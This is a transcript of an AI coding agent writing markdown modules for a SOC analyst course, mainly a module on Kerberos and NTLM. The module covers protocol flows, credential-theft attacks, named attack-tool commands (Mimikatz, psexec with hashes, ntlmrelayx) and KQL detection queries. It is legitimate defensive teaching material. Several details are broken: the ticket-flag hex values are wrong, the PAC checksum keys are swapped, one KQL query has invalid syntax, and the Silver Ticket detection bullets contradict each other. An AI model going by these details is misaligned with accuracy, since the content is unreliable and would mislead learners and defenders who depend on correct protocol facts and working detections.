credential theft via lateral movement. Admins use dedicated accounts per tier + PAW.\n\n5. **What attributes on a user object indicate Kerberoasting risk?**\n   - `servicePrincipalName` (SPN) set, `userAccountControl` has DONT_EXPIRE_PASSWORD (0x10000), password old, not in Protected Users.\n\n6. **What is the difference between Authentication and Authorization in AD?**\n   - AuthN: Kerberos/NTLM → Ticket/Token (who). AuthZ: Token SIDs+Privs + Object DACL → Allow/Deny (what).\n\n7. **What does Event ID 5136 tell you and what attributes should you monitor?**\n   - LDAP Modify. Monitor: `memberOf`, `userAccountControl`, `unicodePwd`, `nTSecurityDescriptor`, `servicePrincipalName`, `msDS-AllowedToActOnBehalfOfOtherIdentity`.\n\n8. **What is a gMSA and why is it more secure than a regular service account?**\n   - Group Managed Service Account: Auto-rotated complex password (120+ chars), managed by DC, no interactive logon, single/multi-server.\n\n9. **How does Entra ID (Azure AD) authentication differ from on-prem AD?**\n   - OAuth/OIDC/SAML vs Kerberos/NTLM. Tenant vs Domain/Forest. Managed identity, conditional access, risk-based auth.\n\n10. **What is Resource-Based Constrained Delegation (RBCD) and what attribute controls it?**\n    - Delegation where *resource* controls who can delegate to it. Attribute: `msDS-AllowedToActOnBehalfOfOtherIdentity` on resource computer/user.\n\n---\n\n## 7.12 Study Checklist for Module 7\n\n- [ ] Define Forest, Domain, DC, GC, FSMO, Trust\n- [ ] List critical user/computer/group attributes and SOC relevance\n- [ ] Explain OU/GPO structure and LSDOU processing\n- [ ] Classify service account types and risk levels\n- [ ] Diagram Tier Model (0/1/2/3) with accounts/PAWs\n- [ ] Explain AdminSDHolder + SDProp mechanism\n- [ ] Distinguish Authentication vs Authorization (Token + DACL)\n- [ ] List BloodHound edge types and attack paths\n- [ ] Identify critical AD Event IDs (4720-4769, 5136-5141)\n- [ ] Explain 5136 monitoring for `memberOf`, `userAccountControl`, `nTSecurityDescriptor`, RBCD\n- [ ] Compare On-prem AD vs Entra ID auth/models\n- [ ] List 10 AD hardening controls\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 8 — Kerberos and NTLM*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/07-active-directory.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra Free · 19.2s)

_Thinking:_

Good, Module 7 is done. Now let me create Module 8 - Kerberos and NTLM.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra Free · 18071.4s)

_Thinking:_

Now let me create Module 8 - Kerberos and NTLM.

---

## User

continue

---

## Assistant (Build · Nemotron 3 Ultra (free) · 168.1s)

_Thinking:_

The user wants me to continue creating the modules. I was working on Module 8 - Kerberos and NTLM. Let me continue with that.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 8: Kerberos and NTLM\n\n**Priority: P0 — Authentication protocols. Understanding these = understanding AD attacks.**\n\n---\n\n## 8.1 Kerberos — The Protocol\n\n### Core Concept\n**Ticket-based authentication** using symmetric cryptography and a trusted third party (KDC). No passwords on the wire.\n\n### Key Components\n| Component | Role |\n|-----------|------|\n| **Client** | User/service requesting access |\n| **KDC (Key Distribution Center)** | Runs on every DC. Two services: AS (Authentication Service) + TGS (Ticket Granting Service) |\n| **AS (Authentication Service)** | Issues TGT (Ticket Granting Ticket) |\n| **TGS (Ticket Granting Service)** | Issues Service Tickets (ST) |\n| **Service/Resource** | Target (file share, web app, SQL, etc.) |\n| **SPN (Service Principal Name)** | Identity of service (HTTP/web01.domain.com, MSSQLSVC/sql01.domain.com:1433) |\n\n### Kerberos Keys (Derived from Password)\n| Key | Usage |\n|-----|-------|\n| **User Long-term Key** | Derived from user password (AES256, AES128, RC4_HMAC_MD5) |\n| **Service Long-term Key** | Derived from service account password |\n| **Session Key** | Generated by KDC, encrypted for client + service |\n| **TGT Session Key** | Client ↔ KDC (TGS) |\n| **Service Session Key** | Client ↔ Service |\n\n---\n\n## 8.2 Kerberos Flow — Step by Step\n\n### Phase 1: AS-REQ / AS-REP (Get TGT)\n```\nClient                                    KDC (AS)\n   │                                          │\n   ├─ AS-REQ ────────────────────────────────►│\n   │  • cname (user@DOMAIN.COM)               │\n   │  • sname (krbtgt/DOMAIN.COM)             │\n   │  • Timestamp (encrypted with user key)   │\n   │  • PaData: PA-ENC-TIMESTAMP (pre-auth)   │\n   │                                          │\n   │                                          ├─ Verify pre-auth (decrypt timestamp)\n   │                                          ├─ Check account (enabled, not expired, etc.)\n   │                                          ├─ Generate TGT Session Key\n   │                                          ├─ Build TGT:\n   │                                          │   • cname, crealm\n   │                                          │   • Ticket flags (forwardable, renewable, etc.)\n   │                                          │   • Auth time, start time, end time, renew-till\n   │                                          │   • TGT Session Key\n   │                                          │   • Encrypted with **krbtgt key** (only KDC can read)\n   │                                          │\n   │                                          ├─ Build AS-REP:\n   │                                          │   • TGT Session Key (encrypted with **user key**)\n   │                                          │   • TGT (opaque to client)\n   │                                          │\n   │◄─ AS-REP ────────────────────────────────┤\n   │                                          │\n```\n\n**Pre-Authentication (PA-ENC-TIMESTAMP)**: Client encrypts timestamp with user key. Proves identity without sending password. **Disabled = AS-REP Roasting vulnerable.**\n\n### Phase 2: TGS-REQ / TGS-REP (Get Service Ticket)\n```\nClient                                    KDC (TGS)\n   │                                          │\n   ├─ TGS-REQ ────────────────────────────────►│\n   │  • TGT (from AS-REP)                     │\n   │  • Authenticator (encrypted with TGT Session Key):\n   │     • cname, ctime, cusec, subkey (optional)\n   │  • sname (SPN: HTTP/web01.domain.com)    │\n   │  • Ticket flags (forwardable, etc.)      │\n   │                                          │\n   │                                          ├─ Decrypt TGT (krbtgt key) → get TGT Session Key\n   │                                          ├─ Decrypt Authenticator (TGT Session Key)\n   │                                          ├─ Verify: cname matches, time skew < 5 min, replay cache\n   │                                          ├─ Check SPN exists, service account valid\n   │                                          ├─ Check delegation / constrained delegation\n   │                                          ├─ Generate Service Session Key\n   │                                          ├─ Build Service Ticket (ST):\n   │                                          │   • cname, crealm\n   │                                          │   • Service Session Key\n   │                                          │   • Flags, times\n   │                                          │   • **Encrypted with SERVICE ACCOUNT KEY**\n   │                                          │\n   │                                          ├─ Build TGS-REP:\n   │                                          │   • Service Session Key (encrypted with TGT Session Key)\n   │                                          │   • Service Ticket (opaque to client)\n   │                                          │\n   │◄─ TGS-REP ────────────────────────────────┤\n   │                                          │\n```\n\n### Phase 3: AP-REQ / AP-REP (Access Service)\n```\nClient                                    Service\n   │                                          │\n   ├─ AP-REQ ────────────────────────────────►│\n   │  • Service Ticket (ST)                   │\n   │  • Authenticator (encrypted with Service Session Key):\n   │     • cname, ctime, cusec, subkey, seq#\n   │  • Optional: Mutual auth requested       │\n   │                                          │\n   │                                          ├─ Decrypt ST (service account key) → Service Session Key\n   │                                          ├─ Decrypt Authenticator (Service Session Key)\n   │                                          ├─ Verify: cname, time, replay\n   │                                          ├─ **Authorization**: Check token (SIDs from PAC) vs DACL\n   │                                          │\n   │                                          │  (If mutual auth requested)\n   │                                          ├─ Build AP-REP:\n   │                                          │   • Server time (encrypted with Service Session Key)\n   │                                          │\n   │◄─ AP-REP (optional) ─────────────────────┤\n   │                                          │\n```\n\n---\n\n## 8.3 Critical Kerberos Structures\n\n### PAC (Privilege Attribute Certificate) — **Inside TGT & Service Ticket**\n```\nPAC Contains:\n├── Logon Info: User SID, Group SIDs, Primary Group, Logon Time, Logoff Time, Kickoff Time, Password Last Set, Password Can Change, Password Must Change, Effective Name, Full Name, Logon Script, Profile Path, Home Directory, Home Dir Drive, Logon Server, Logon Domain Name, Domain SID\n├── Credentials Info: (supplemental creds for NTLM, etc.)\n├── Server Checksum: KDC signature (krbtgt key)\n├── KDC Checksum: Service account key signature\n└── **UPN/DNS Info** (optional)\n```\n\n**Why PAC matters**: \n- **Authorization data** — Groups/SIDs determine access\n- **Silver Ticket** — Forge Service Ticket with custom PAC\n- **Golden Ticket** — Forge TGT with custom PAC (needs krbtgt hash)\n\n### Ticket Flags (Bitmask)\n| Flag | Hex | Meaning |\n|------|-----|---------|\n| **Forwardable** | 0x40000000 | Can be forwarded (delegation) |\n| **Forwarded** | 0x00000001 | Already forwarded |\n| **Proxiable** | 0x20000000 | Can be proxied (constrained delegation) |\n| **Proxy** | 0x00000002 | Is a proxy ticket |\n| **Renewable** | 0x00000008 | Can be renewed (up to renew-till) |\n| **Initial** | 0x00000010 | TGT (not service ticket) |\n| **Pre-Authent** | 0x00000020 | Pre-auth used |\n| **HW-Authent** | 0x00000040 | Hardware auth (smartcard) |\n| **Ok-As-Delegate** | 0x00000080 | Service trusted for delegation |\n\n---\n\n## 8.4 Kerberos Encryption Types (etype)\n\n| etype | Algorithm | Status |\n|-------|-----------|--------|\n| **18** | AES256-CTS-HMAC-SHA1-96 | **Preferred** |\n| **17** | AES128-CTS-HMAC-SHA1-96 | Good |\n| **23** | RC4-HMAC-MD5 | **Weak** (Kerberoasting target) |\n| **3** | DES-CBC-MD5 | **Disabled** (legacy) |\n| **1/2** | DES-CBC-CRC | **Disabled** |\n\n**Check**: `msDS-SupportedEncryptionTypes` on user/computer. **28 (16+8+4) = AES256 + AES128 + RC4**. **24 (16+8) = AES only (secure)**.\n\n---\n\n## 8.5 Kerberos Attacks — Detection Focus\n\n### 1. Kerberoasting (TGS-REQ for Service Accounts)\n**Attack**: Request TGS for SPN → Get ST encrypted with service account key → Offline crack (RC4 = easy).\n**Prereqs**: Any domain user, SPN exists on service account.\n**Event**: **4769** (TGS-REQ) with `TicketEncryptionType = 0x17 (RC4)` targeting service accounts.\n```kql\nSecurityEvent\n| where EventID == 4769\n| where TicketEncryptionType == 23  // RC4\n| where TargetUserName has \"@\"  // SPN format\n| summarize Count=count(), Services=make_set(ServiceName) by TargetUserName, IpAddress, TimeGenerated bin 1h\n| where Count > 10\n```\n\n### 2. AS-REP Roasting (No Pre-Auth)\n**Attack**: Request AS-REQ for user WITHOUT pre-auth → Get AS-REP with encrypted TGT Session Key → Offline crack.\n**Prereqs**: User has `DONT_REQUIRE_PREAUTH` (UF_DONT_REQUIRE_PREAUTH = 0x400000 in userAccountControl).\n**Event**: **4768** (AS-REQ) with `PreAuthType = 0` (no pre-auth) + **4771** (Pre-Auth Failed) for same user.\n```kql\nSecurityEvent\n| where EventID == 4768\n| where PreAuthType == 0  // No pre-auth\n| join kind=inner (\n    SecurityEvent\n    | where EventID == 4771\n    | project TargetUserName, TimeGenerated, FailureCode\n) on TargetUserName\n```\n\n### 3. Pass-the-Ticket (PtT)\n**Attack**: Steal TGT/ST from memory (LSASS) → Inject into session → Access as user.\n**Tools**: Rubeus, Mimikatz (`kerberos::ptt`)\n**Detection**: \n- **4624 Logon Type 9** (NewCredentials) with unusual source\n- **4672** (Special Logon) without preceding 4624\n- Multiple TGTs for same user from different IPs\n- Ticket lifetime anomalies (10hr default, 7d renewable)\n\n### 4. Golden Ticket\n**Attack**: Forge TGT using **krbtgt hash** → Any user, any group, any lifetime (10yr default).\n**Prereqs**: Domain Admin (or equivalent) to dump krbtgt hash (DCSync, NTDS.dit).\n**Detection**:\n- TGT with **non-standard PAC** (groups not matching AD)\n- TGT lifetime > 10 hours (default) or weird renew-till\n- **4768** from unusual source (not user workstation)\n- krbtgt password age > 180 days (rotation indicator)\n\n### 5. Silver Ticket\n**Attack**: Forge **Service Ticket** using **service account hash** → Access specific service.\n**Prereqs**: Service account hash (Kerberoasting, DCSync, local admin on server).\n**Detection**:\n- **4769** for service not matching user's normal access\n- Service Ticket with custom PAC (e.g., Domain Admin SIDs for HTTP service)\n- No corresponding TGS-REQ (4769) from KDC (forged locally)\n\n### 6. Skeleton Key\n**Attack**: Patch LSASS on DC → Universal \"master password\" for any user.\n**Detection**: \n- **4624** success for accounts with wrong password (no 4625 preceding)\n- DC LSASS memory patch (EDR)\n- Unusual auth patterns across many accounts\n\n### 7. Delegation Attacks\n| Type | Mechanism | Abuse |\n|------|-----------|-------|\n| **Unconstrained** | `TRUSTED_FOR_DELEGATION` | Compromise server → steal TGTs of connecting users |\n| **Constrained** | `msDS-AllowedToDelegateTo` (SPN list) | Compromise server → request ST for listed SPNs |\n| **Resource-Based (RBCD)** | `msDS-AllowedToActOnBehalfOfOtherIdentity` on resource | Write access on resource → add attacker → impersonate any user |\n\n**Detection**: \n- 5136: `msDS-AllowedToActOnBehalfOfOtherIdentity` modification (RBCD)\n- 4769: S4U2Self + S4U2Proxy (constrained delegation flow)\n- Computer accounts with `TRUSTED_FOR_DELEGATION` (unconstrained)\n\n---\n\n## 8.6 NTLM — The Legacy Protocol\n\n### Why It Still Exists\n- Pre-Windows 2000 compatibility\n- Workgroup / non-domain auth\n- Local accounts\n- Fallback when Kerberos fails (SPN missing, DNS issues, firewall)\n- Some apps hardcode NTLM\n\n### NTLM Versions\n| Version | Challenge/Response | Security |\n|---------|-------------------|----------|\n| **NTLMv1** | DES-based, 56-bit | **Broken** (2012) |\n| **NTLMv2** | HMAC-MD5, variable challenge | **Better** but relayable |\n| **NTLMv2 Session Security** | Signing/Sealing | Adds integrity |\n\n### NTLM Authentication Flow\n```\nClient                                    Server/DC\n   │                                          │\n   ├─ NEGOTIATE_MESSAGE ─────────────────────►│\n   │  • Flags (signing, sealing, target info) │\n   │                                          │\n   │◄─ CHALLENGE_MESSAGE ────────────────────┤\n   │  • Server Challenge (8 bytes)            │\n   │  • Target Info (AV_PAIRS: DNS, SPN, etc) │\n   │                                          │\n   ├─ AUTHENTICATE_MESSAGE ─────────────────►│\n   │  • Username, Domain                      │\n   │  • LM Response (NTLMv1) / NTLMv2 Response│\n   │  • NT Response (NTLMv2)                  │\n   │  • Session Key (derived)                 │\n   │                                          │\n   │          (Server validates against DC    │\n   │           via Netlogon Secure Channel)   │\n   │                                          │\n   │◄─ Result ────────────────────────────────┤\n   │                                          │\n```\n\n### NTLM Hashes\n| Hash | Algorithm | Use |\n|------|-----------|-----|\n| **LM Hash** | DES(uppercase password) | **Disabled by default** (NoLMHash policy) |\n| **NT Hash (NTLM)** | MD4(UTF-16LE(password)) | **What's stored in NTDS.dit / SAM** |\n| **NTLMv1 Response** | DES(NT Hash, Challenge) | Broken |\n| **NTLMv2 Response** | HMAC-MD5(NT Hash, Challenge + Client Nonce + Target Info) | Current |\n\n**Key Fact**: **NT Hash = Password Equivalent**. Pass-the-Hash uses NT Hash directly.\n\n---\n\n## 8.7 NTLM Attacks\n\n### 1. Pass-the-Hash (PtH)\n**Attack**: Use NT Hash (no password needed) → Authenticate as user.\n**Tools**: Mimikatz (`sekurlsa::pth`), Rubeus (`pth`), Impacket (`psexec.py -hashes`)\n**Requirement**: NTLM auth (not Kerberos). Works for: SMB, WinRM, RPC, LDAP, MSSQL.\n**Detection**:\n- **4624 Logon Type 3** (Network) + **4776** (NTLM on DC) for same user from different sources\n- No preceding 4625 (failed logon)\n- Source: unusual (workstation not user's)\n- **EDR**: LSASS access + NTLM auth from same process\n\n### 2. NTLM Relay\n**Attack**: Intercept NTLM auth → Relay to another service → Authenticate as victim.\n**Tools**: ntlmrelayx.py, PetitPotam (coerce auth), ntlmrelayx + AD CS (ESC8)\n**Prereqs**: \n- No signing required (SMB signing disabled, LDAP signing disabled)\n- Target service accepts NTLM\n**Detection**:\n- **4624/4776** from relay machine (not user workstation)\n- Multiple auths from same source IP for different users\n- **Event 5156** (Filtering Platform) showing connection to relay target\n- **PetitPotam**: 4624 Type 3 from DC$ (computer account) to CA/WebDAV\n\n### 3. Password Spray (NTLM)\n**Attack**: One password (e.g., \"Password123\") → Many users → Avoid lockout.\n**Protocol**: Often NTLM (Kerberos pre-auth also works).\n**Detection**:\n- **4625** / **4776** with `Status = 0xC000006A` (bad password) across many users\n- Same source IP, low volume per user (1-3), high total\n- Often targets service accounts (no lockout policy)\n\n### 4. Relay to AD CS (ESC8 / PetitPotam)\n**Attack**: Coerce DC to auth to attacker (MS-EFSRPC) → Relay to AD CS HTTP endpoint → Enroll cert for DC$ → Request TGT (PKINIT) → Domain Admin.\n**Detection**: \n- 4624 Type 3 from DC$ to CA server (port 80/443)\n- Cert enrollment for DC$ (CA logs)\n- Subsequent 4768 (PKINIT) for DC$\n\n---\n\n## 8.8 Kerberos vs NTLM — Comparison\n\n| Aspect | Kerberos | NTLM |\n|--------|----------|------|\n| **Mechanism** | Tickets (TGT + ST) | Challenge/Response |\n| **Crypto** | Symmetric (AES/RC4) | Hash-based (MD4/MD5) |\n| **Mutual Auth** | Yes (AP-REP) | Optional (NTLMv2) |\n| **Delegation** | Yes (constrained/unconstrained) | No |\n| **Offline Crack** | Kerberoasting (ST), AS-REP Roasting | NTLMv2 hash capture |\n| **Relay** | No (tickets bound to service) | **Yes** (major risk) |\n| **Pass-the-Hash** | No (need krbtgt for Golden) | **Yes** (NT Hash) |\n| **Credential Storage** | Keys derived from password | NT Hash in memory/NTDS.dit |\n| **Default in Domain** | Yes (preferred) | Fallback only |\n\n---\n\n## 8.9 Critical Event IDs Summary\n\n| Event ID | Protocol | Phase | Key Fields |\n|----------|----------|-------|------------|\n| **4768** | Kerberos | AS-REQ/REP | TargetUserName, ServiceName (krbtgt), PreAuthType, TicketEncryptionType, ResultCode, IpAddress |\n| **4769** | Kerberos | TGS-REQ/REP | TargetUserName, ServiceName (SPN), TicketOptions, TicketEncryptionType, ResultCode, IpAddress |\n| **4770** | Kerberos | TGS Renewal | Similar to 4769 |\n| **4771** | Kerberos | Pre-Auth Failed | TargetUserName, ServiceName, FailureCode (0x18=bad pwd), PreAuthType |\n| **4772** | Kerberos | TGT Request Failed | Similar to 4768 failure |\n| **4776** | NTLM | DC Validation | TargetUserName, Workstation, Status (0x0=success), IpAddress (if logged) |\n| **4624** | Both | Logon | LogonType, AuthenticationPackage (Kerberos/NTLM), LogonProcessName, IpAddress |\n| **4625** | Both | Failed Logon | Status, SubStatus, LogonType, AuthenticationPackage |\n\n---\n\n## 8.10 Detection Queries (KQL)\n\n### Kerberoasting\n```kql\nSecurityEvent\n| where EventID == 4769\n| where TicketEncryptionType == 23  // RC4\n| where ServiceName has \"@\"  // SPN format\n| summarize Count=count(), Services=make_set(ServiceName), Start=min(TimeGenerated), End=max(TimeGenerated) \n  by TargetUserName, IpAddress, Computer, bin(TimeGenerated, 1h)\n| where Count >= 10\n| extend Duration = End - Start\n```\n\n### AS-REP Roasting\n```kql\nSecurityEvent\n| where EventID == 4768\n| where PreAuthType == 0  // No pre-auth\n| join kind=inner (\n    SecurityEvent\n    | where EventID == 4771\n    | project TargetUserName, TimeGenerated, FailureCode\n) on TargetUserName\n| where FailureCode == 0x18  // Bad password (attacker trying)\n```\n\n### Pass-the-Hash\n```kql\n// NTLM success without prior failure\nSecurityEvent\n| where EventID == 4624 and LogonType == 3 and AuthenticationPackage == \"NTLM\"\n| join kind=leftanti (\n    SecurityEvent\n    | where EventID == 4625 and LogonType == 3\n    | project TargetUserName, IpAddress, TimeGenerated\n) on TargetUserName, IpAddress\n| where TimeGenerated > ago(1h)\n```\n\n### NTLM Relay (PetitPotam)\n```kql\nSecurityEvent\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName endswith \"$\"  // Computer account\n| where TargetUserName == \"DC01$\"  // Specific DC\n| where IpAddress == \"10.10.10.50\"  // CA / WebDAV server\n```\n\n### Golden Ticket Indicators\n```kql\nSecurityEvent\n| where EventID == 4768\n| where TicketOptions has \"renewable\"  // Check renew-till\n| extend RenewTill = parse_timestamp(...)\n// Look for: renew-till > 10 years, unusual groups in PAC (hard from logs alone)\n// Better: EDR detection of forged tickets, krbtgt password age\n```\n\n---\n\n## 8.11 Interview Questions for This Module\n\n1. **Explain the Kerberos AS-REQ/AS-REP flow and what pre-authentication does.**\n   - Client requests TGT from AS, encrypts timestamp with user key (pre-auth). KDC verifies, returns TGT (encrypted with krbtgt key) + TGT Session Key (encrypted with user key).\n\n2. **What is the difference between a TGT and a Service Ticket?**\n   - TGT: From AS, encrypted with krbtgt key, used to request Service Tickets from TGS. Service Ticket: From TGS, encrypted with service account key, used to access specific service (AP-REQ).\n\n3. **What is Kerberoasting and what Event ID detects it?**\n   - Request TGS for SPN (service account) → Get ST encrypted with service key → Offline crack. **Event 4769** with RC4 (etype 23) encryption.\n\n4. **What is AS-REP Roasting and what user attribute enables it?**\n   - Request AS-REQ without pre-auth → Get encrypted TGT Session Key → Offline crack. Enabled by `userAccountControl` flag `DONT_REQUIRE_PREAUTH` (0x400000).\n\n5. **Explain Pass-the-Hash vs Pass-the-Ticket.**\n   - PtH: Use NT Hash for NTLM auth (SMB, WinRM, etc.). PtT: Inject stolen Kerberos ticket (TGT/ST) into session for Kerberos auth.\n\n6. **What is a Golden Ticket and what hash is needed to forge it?**\n   - Forged TGT with custom PAC (any user, any groups, long lifetime). Needs **krbtgt hash** (Domain Admin / DCSync).\n\n7. **What is a Silver Ticket and how does it differ from Golden?**\n   - Forged Service Ticket (not TGT) using **service account hash**. Only accesses that specific service. No KDC interaction.\n\n8. **How does NTLM Relay work and what prevents it?**\n   - Intercept NTLM auth → Relay to target service. Prevented by: **SMB signing**, **LDAP signing**, **EPA (Extended Protection for Auth)**, **Disable NTLM**.\n\n9. **What Event ID shows NTLM authentication on a Domain Controller?**\n   - **4776** (Credential Validation). Shows TargetUserName, Workstation, Status.\n\n10. **What is Resource-Based Constrained Delegation (RBCD) and what attribute controls it?**\n    - Delegation where *resource* controls who can delegate to it. Attribute: `msDS-AllowedToActOnBehalfOfOtherIdentity` on the resource computer/user object.\n\n---\n\n## 8.12 Study Checklist for Module 8\n\n- [ ] Draw Kerberos flow (AS-REQ/REP, TGS-REQ/REP, AP-REQ/REP) from memory\n- [ ] Explain PAC contents and significance\n- [ ] List encryption types (etype) and which are weak\n- [ ] Describe 7 Kerberos attacks: Kerberoasting, AS-REP Roasting, PtT, Golden, Silver, Skeleton Key, Delegation\n- [ ] Write KQL for Kerberoasting, AS-REP Roasting, PtH, NTLM Relay\n- [ ] Explain NTLM flow (Negotiate, Challenge, Authenticate)\n- [ ] Differentiate LM Hash, NT Hash, NTLMv1/v2 Response\n- [ ] Compare Kerberos vs NTLM (table)\n- [ ] Map Event IDs: 4768, 4769, 4770, 4771, 4772, 4776, 4624, 4625\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 9 — Networking for SOC*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/08-kerberos-ntlm.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 31.3s)

_Thinking:_

Module 8 is complete. Now let me continue with Module 9 - Networking for SOC.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
